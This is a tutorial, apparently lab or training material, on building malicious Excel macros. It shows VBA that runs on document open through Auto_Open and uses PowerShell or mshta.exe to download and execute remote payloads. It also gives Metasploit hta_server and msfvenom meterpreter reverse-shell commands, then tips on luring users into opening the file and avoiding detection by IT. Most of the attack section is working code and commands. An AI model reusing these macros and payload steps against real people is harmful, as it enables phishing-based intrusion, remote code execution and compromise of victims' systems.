Creating a Simple Macro:
	1. Start Excel and create a new workbook and head over to the “View” tab.
	2. Within there, you will find a section called “Macros”, Clicking the button will display a drop-down menu where you will have the option to create a new Macro. Click “Create New Macro”, you should see a new window open.
	3. You can name your new Macro whatever you like. It’s important to know that later, the Macro name is not just an arbitrary value. It can add some additional functions, and do some special things that will help us later. After entering a name for the Macro, and clicking “Create” you should see a new window open that looks very different from Excel’s normal interface.
	4. This is Microsoft’s Visual Basic Macro Creator/Editor. This is where we will eventually create our Malicious Macro. Here, we can write visual basics to perform actions, even execute OS commands. For example, we can use:

	PID = Shell("powershell.exe -c Invoke-WebRequest -Uri https://192.168.125.1/shadow -OutFile C:\Shadow", vbNormalFocus)

	5. This will connect out to a remote server and download the file “Shadow” and save it to the root of the file system as a file called “Shadow” (How creative).

	6. Let's say we wanted to step it up a notch and require the user to not interact with the Macro to trigger the remote connection to the HTTP Server, is this possible? If so, how can we do it?

	It turns out, the answer is “Yes, (onto the) Next Question” and “Very easily”. To make a Macro execute on the document opening, we can add a useful “Sub” called “Auto_Open”. Upon document opening, whatever is in that Sub will be run, in this scenario, I’ll call the HelloWorld Sub upon document opening with the following code below.

		```
		Sub HelloWorld()
		    PID = Shell("powershell.exe -c Invoke-WebRequest -Uri https://192.168.125.1/passwd -OutFile C:\passwd", vbNormalFocus)
		End Sub

		Sub Auto_Open()
		    HelloWorld
		End Sub
		```

	7. After saving this document as an xlsm (Excel Macro-Enabled Document) and upon reopening it, we should see a call out to our remote web server attempting to retrieve the file “passwd”.

	8. Microsoft has added a feature where the user must authorize Macros to be executed on the document to help protect the end-user. Fortunately, most people just don’t care and will click “Enable Content” or have the “Allow All Macros” setting enabled by default. 


Creating a Malicious Macro:
	1. Now that you are more familiar with creating a Macro and utilizing the Auto_Open feature within Office Products, we can dive into creating and generating malicious Macros.
	2. First, we will start off by manually creating a macro. We will be re-using the code from the previous section as our base, and we will also be utilizing Metasploit’s HTA Server to gain a reverse shell. 

	To set up Metasploit’s HTA Server for payload delivery you will need to use the module exploit/windows/misc/hta_server.
		>use exploit/windows/misc/hta_server
		>set lport 53
		>set lhost <interface>
		>exploit -j

	3. The URL containing the “Local IP” (In this case: https://192.168.100.128:8080/c94O6fz.hta) is the server that will deliver the payload to the unsuspecting victim. At the moment, we only have a URL that will deliver a payload, so how does this get executed on the machine? 

	4. Simply reaching out to the remote server won’t cause the payload to fire, because it’s not an executable (It’s a .hta). We can use mshta.exe (A built-in executable on Windows devices that’s used to aid in script execution with HTML applications) to execute the file on the remote server and return a shell. You can do this by calling mshta.exe followed by the URL of the Payload Delivery server, ex. https://192.168.100.128:8080/c94O6fz.hta, so the full command would look as follows.

	>mshta.exe https://192.168.100.128:8080/c9406fx.hta
		If we simply change our previous command in our “Hello World” Macro from Invoke-WebRequest to the command above (Remember, your IP address will be different), we will have a reverse shell returned.

	Sub HelloWorld()
	    PID = Shell("mshta.exe https://192.168.100.128:8080/c9496fz.hta")
	End Sub

	Sub Auto_Open()
	    HelloWorld
	End Sub

	5. If we run the script Macro now, we should see mshta.exe reach out to our Payload server and successfully deliver the payload.

Generating Macros with msfvenom:
	1. Alternatively, you can use msfvenom to create Malicious Macros, the syntax is much simpler, all you need to do is the following:
		>msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=53 -f vba -o macro.vba

	2. You will need to take the given visual basic macro from MSFVenom and paste it into the excel macro editor.
	3. Note: This is only an alternative to show theory behind malicious macros. There is Anti-Virus enabled on the box and we highly recommend that you take the HTA server route for creating a malicious macro.

Sending off the Malicious Macro:
	1. After setting up exploit/multi/handler to catch the Reverse Shell, we are ready to have the end-user open the Document.
	2. If you attempt to use this in the real world (with Authorization of course), it’s ideal that you populate the spreadsheet with actual data. Opening up a spreadsheet/document with absolutely no data is a quick way to raise some alarms.

Finding an Attack Vector:
	Attempting to find an attack vector to successfully utilize Malicious Macros may be difficult at first, the trick is asking yourself “Is a human going to read this?”. If you answer “Yes”, it’s worth attempting this attack. You should be cautious when using this attack because you never know who’s inbox it might end up in. The last thing you want is IT aware of your presence on the network...

	







